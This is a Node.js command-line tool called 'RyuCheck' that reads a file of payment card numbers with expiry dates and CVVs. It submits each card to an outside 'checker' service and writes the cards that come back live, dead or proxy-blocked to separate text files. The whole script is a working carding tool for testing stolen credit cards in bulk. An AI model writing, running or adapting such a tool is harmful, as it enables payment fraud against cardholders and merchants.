const request = require('request');
const readline = require('readline-sync');
const fs = require('fs');
const chalk = require('chalk');
const figlet = require('figlet');
const delay = require('delay');
const dated = new Date();
const procid = process.pid;
const token = require('./token');


const banner = (error,response,body) => {

	console.log(figlet.textSync('RyuCheck',{
		font: 'Graffiti',
		horizontalLayout:'default',
		verticalLayout:'default',
		width:80,
		whitespaceBreak:true
	}));
	console.log("\n\n");
	console.log(chalk.green(' -- RyuJin Checker Services'));
	console.log(chalk.yellow('FORMAT LIST : CARDNUMBER|EXPIRED_MONTH|EXPIRED_YEAR|CVV '));
	console.log(chalk.cyan('INPUT YOUR TOKEN IN [ token.js ] FILE ! '))
	if(!error && response.statusCode == 200)
		{
			var resp = JSON.parse(body);
			
			if(resp.status == 'valid' && resp.alert !== 'less_points'){
			console.log(chalk.green(resp.msg));
			}else{
			console.log(chalk.red(resp.alert));
			console.log(chalk.red(resp.msg));
			process.kill(process.pid);
			}
		}else{
			console.log('CANT GET INFO FROM SERVER ');
			console.log('CONNECTION ERROR');
			process.kill(process.pid);
		}
}

const winfo = (token) =>{
	const options = {
		url: 'https://shinryujin.net/?c=extend&a=ryucheck_validate',
		headers:{
			'User-Agent': 'RyuCheck-'+token,
			'TOKEN': token
		}
	}

	 request(options,banner);
}

const cb = (error,response,body)=>{
	 if (!error && response.statusCode == 200) {

	 var x = JSON.parse(body);
	 if(typeof x == "object"){
	 	var gates = x.gate_info;
    if(body.match(/live/i))
    {
    	console.log(chalk.green('----------------------------------------------------------------'));
    	console.log(chalk.green('[RYUJIN] LIVE          | '),` ${x.credit_card_number} | [live-${procid}.txt] | Checked on : ${gates}`)
   		 console.log(chalk.cyan('[RYUJIN] BIN           : '),x.bin);
    	console.log(chalk.green('----------------------------------------------------------------'));
   		fs.appendFileSync('live-'+procid+'.txt',x.credit_card_number+"\n");
    }else if(body.match(/proxy_blocked/i))
    {
    	console.log(chalk.yellow('[RYUJIN] PROXY BLOCKED | '),` ${x.credit_card_number} | [uncheck-${procid}.txt] | Checked on : ${gates}`);
    	fs.appendFileSync('uncheck-'+procid+'.txt',x.credit_card_number+"\n");
    }else if(body.match(/declined/i))
    {
    	console.log(chalk.red('[RYUJIN] DEAD          | '),` ${x.credit_card_number} | [dead-${procid}.txt] | Checked on : ${gates}`);
    	fs.appendFileSync('dead-'+procid+'.txt',x.credit_card_number+"\n");
    }else if(body.match(/error/i)){
    	console.log('[RYUJIN] ERROR ');
    }else{
    	console.log('[RYUJIN] UNKNOWN')
    }

  }else{
  	console.log('error');
  }
	}else{
		console.log(body);
	}
}

const check =  (datax,token) =>{

	const options = {
		url: 'https://shinryujin.net/?c=extend&a=ryucheck_validate&cclist='+datax,
		headers:{
			'User-Agent': 'RyuCheck-'+token,
			'TOKEN': token,
			'ACTION': 'check'
		},
		datacc:datax
	}
	 request(options,cb);


}

const run =async  () => {
	 await winfo(token);
	 await console.log("\n\n");
	
	 await delay(500);
	await console.log("\n\n");
	var answa = await readline.question('INPUT CC LIST >>');
		  fs.readFile(answa, async function(err, data) {
      if (err){console.log(err); console.log('dantoi')}
      const array = data
        .toString()
        .replace(/\r\n|\r|\n/g, " ")
        .split(" ");
       console.log(chalk.cyan('[RYUJIN] CHECKER SERVICES PROCESS STARTED WITH ID : #'+procid));
	 for (var ccdetail in array){

	 
         await check(array[ccdetail],token);
         await delay(500);

    	
	 	}

		 
	 }); // end readfile
		 

}


run();
